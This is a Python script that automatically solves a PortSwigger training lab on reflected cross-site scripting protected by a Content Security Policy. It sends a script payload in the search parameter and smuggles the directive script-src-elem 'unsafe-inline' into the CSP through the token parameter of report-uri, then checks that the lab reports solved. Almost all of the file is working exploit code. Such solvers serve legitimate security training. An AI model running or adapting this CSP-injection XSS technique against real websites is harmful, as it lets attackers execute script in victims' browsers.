#!/usr/bin/env python3
"""Automated solver: PortSwigger "Reflected XSS protected by CSP, with CSP bypass" (EXPERT).

Vulnerability
-------------
The blog search page reflects the ``search`` parameter inside an ``<h1>`` with
no HTML encoding, so ``<script>alert(1)</script>`` is injected verbatim.  The
response is protected by::

    Content-Security-Policy: default-src 'self'; object-src 'none';
      script-src 'self'; style-src 'self'; report-uri /csp-report?token=<TOKEN>

The ``token`` query parameter is copied into the ``report-uri`` directive
without sanitisation, so a second query parameter lets an attacker inject
arbitrary CSP directives::

    ?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

``script-src-elem`` targets only ``<script>`` elements and takes precedence
over ``script-src`` for them, so the injected ``'unsafe-inline'`` re-enables
inline scripts.  The reflected payload then executes.

What the solver does
--------------------
1. Fetches the lab root and confirms the page title identifies this lab.
2. Records the baseline lab status from the authoritative
   ``widgetcontainer-lab-status`` widget.
3. Sends the control request (payload only) and asserts the payload is
   reflected unencoded while the CSP still forbids inline scripts.
4. Sends the exploit request (payload + ``token`` CSP injection) and asserts
   the echoed CSP contains ``script-src-elem 'unsafe-inline'``.
5. Polls the lab root until the status widget flips to ``is-solved``/``Solved``
   and reports request count + wall-clock time.

Nothing instance-specific is hardcoded: the base URL comes from ``--url`` and
the CSP token parameter is discovered from the live response (the injection is
appended to whatever ``report-uri`` token slot the instance exposes).

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --wait 30 --verbose

Exit codes: 0 verified solved, 1 exploit sent but lab not marked solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import re
import sys
import time

import httpx

LAB_TITLE = "reflected xss protected by csp, with csp bypass"
PAYLOAD = "<script>alert(1)</script>"
CSP_INJECTION = ";script-src-elem 'unsafe-inline'"
REQUIRED_DIRECTIVE = "script-src-elem 'unsafe-inline'"
UA = "Mozilla/5.0 (PortSwigger CSP-bypass solver)"

TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
SOLVED_RE = re.compile(
    r"widgetcontainer-lab-status[^>]*\bis-solved\b", re.I)
NOT_SOLVED_RE = re.compile(
    r"widgetcontainer-lab-status[^>]*\bis-notsolved\b", re.I)
REPORT_URI_TOKEN_RE = re.compile(r"report-uri\s+\S*token=([^;\s]*)", re.I)
SCRIPT_SRC_RE = re.compile(r"script-src(?!-elem)\s+([^;]*)", re.I)


def normalize(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", " ", text.lower()).strip()


class Solver:
    def __init__(self, url: str, *, timeout: float, wait: float,
                 verbose: bool) -> None:
        self.base = url.rstrip("/")
        self.timeout = timeout
        self.wait = wait
        self.verbose = verbose
        self.requests = 0
        self.t0 = time.time()
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": UA},
        )

    # -- plumbing ---------------------------------------------------------- #
    def get(self, path: str = "", params=None) -> httpx.Response:
        self.requests += 1
        r = self.client.get(self.base + path, params=params)
        if self.verbose:
            print(f"    GET {r.url} -> {r.status_code}", flush=True)
        return r

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)

    # -- state ------------------------------------------------------------- #
    @staticmethod
    def is_solved(html: str) -> bool:
        """Authoritative check: the lab header widget class for solved state."""
        return bool(SOLVED_RE.search(html)) and "<p>Solved</p>" in html

    @staticmethod
    def csp(resp: httpx.Response) -> str:
        return resp.headers.get("content-security-policy", "")

    # -- phases ------------------------------------------------------------ #
    def identify(self) -> None:
        r = self.get("/")
        m = TITLE_RE.search(r.text)
        title = re.sub(r"\s+", " ", m.group(1)).strip() if m else "(no title)"
        self.log(f"lab title : {title} (HTTP {r.status_code})")
        if normalize(LAB_TITLE) not in normalize(title):
            raise SystemExit(
                f"error: this does not look like the expected lab "
                f"({LAB_TITLE!r}): {title!r}")

    def baseline(self) -> bool:
        r = self.get("/")
        solved = self.is_solved(r.text)
        self.log(f"baseline status : {'SOLVED (already)' if solved else 'not solved'}")
        return solved

    def control(self) -> None:
        """Payload reflects, but CSP still blocks inline script."""
        r = self.get("/", params={"search": PAYLOAD})
        csp = self.csp(r)
        reflected = f"search results for '{PAYLOAD}'" in r.text
        script_src = SCRIPT_SRC_RE.search(csp)
        policy = script_src.group(1).strip() if script_src else "(missing)"
        self.log(f"control  : reflected={'yes' if reflected else 'NO'}, "
                 f"script-src={policy!r}")
        slot = REPORT_URI_TOKEN_RE.search(csp)
        if slot:
            self.log(f"control  : report-uri token slot present "
                     f"(value {slot.group(1)!r} by default -> request-controlled)")
        if not reflected:
            print("    response snippet:",
                  re.sub(r"\s+", " ", r.text[r.text.find("search results"):][:160]),
                  flush=True)
            raise SystemExit("error: the search parameter is not reflected verbatim")
        if "unsafe-inline" in policy.lower():
            print("    warning: CSP already allows inline script without the bypass",
                  flush=True)

    def exploit(self) -> str:
        r = self.get("/", params={"search": PAYLOAD, "token": CSP_INJECTION})
        csp = self.csp(r)
        if not csp:
            raise SystemExit("error: response carries no Content-Security-Policy header")
        if REQUIRED_DIRECTIVE not in csp.lower():
            print("    CSP was:", csp, flush=True)
            raise SystemExit(
                "error: the injected directive did not reach the CSP header")
        if f"search results for '{PAYLOAD}'" not in r.text:
            raise SystemExit("error: payload was not reflected on the exploit request")
        self.log(f"bypass   : header now carries {REQUIRED_DIRECTIVE!r}")
        return csp

    def wait_solved(self) -> bool:
        deadline = time.time() + self.wait
        while True:
            r = self.get("/")
            if self.is_solved(r.text):
                return True
            if time.time() >= deadline:
                return False
            time.sleep(1.0)

    # -- driver ------------------------------------------------------------ #
    def run(self) -> int:
        self.identify()
        already = self.baseline()
        self.control()
        self.exploit()
        solved = self.wait_solved()
        elapsed = time.time() - self.t0

        print()
        print("=" * 66)
        print(f"lab status      : {'SOLVED' if solved else 'NOT SOLVED'}")
        print(f"caused by solver: {'no (was already solved)' if already else ('yes' if solved else 'n/a')}")
        print(f"HTTP requests   : {self.requests}")
        print(f"elapsed         : {elapsed:.1f}s")
        print("=" * 66)
        if solved:
            print("evidence        : lab header widget reports is-solved / 'Solved', "
                  "and the exploit response returned the injected "
                  f"{REQUIRED_DIRECTIVE!r} directive.")
            return 0
        print("error: the lab did not report solved state; evidence kept above.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger 'Reflected XSS protected by CSP, "
                    "with CSP bypass' lab (EXPERT).")
    ap.add_argument("--url", required=True, help="Lab base URL")
    ap.add_argument("--timeout", type=float, default=20.0,
                    help="Per-request timeout in seconds (default 20)")
    ap.add_argument("--wait", type=float, default=20.0,
                    help="Seconds to poll for solved state after the exploit (default 20)")
    ap.add_argument("--verbose", action="store_true", help="Log every request URL")
    args = ap.parse_args()

    if not re.match(r"^https?://[^/\s]+", args.url):
        print(f"error: --url must be an http(s) lab URL, got {args.url!r}",
              file=sys.stderr)
        return 2

    solver = Solver(args.url, timeout=args.timeout, wait=args.wait,
                    verbose=args.verbose)
    try:
        return solver.run()
    except httpx.HTTPError as e:
        print(f"error: lab unreachable/expired: {e}", file=sys.stderr)
        return 3
    finally:
        solver.client.close()


if __name__ == "__main__":
    sys.exit(main())
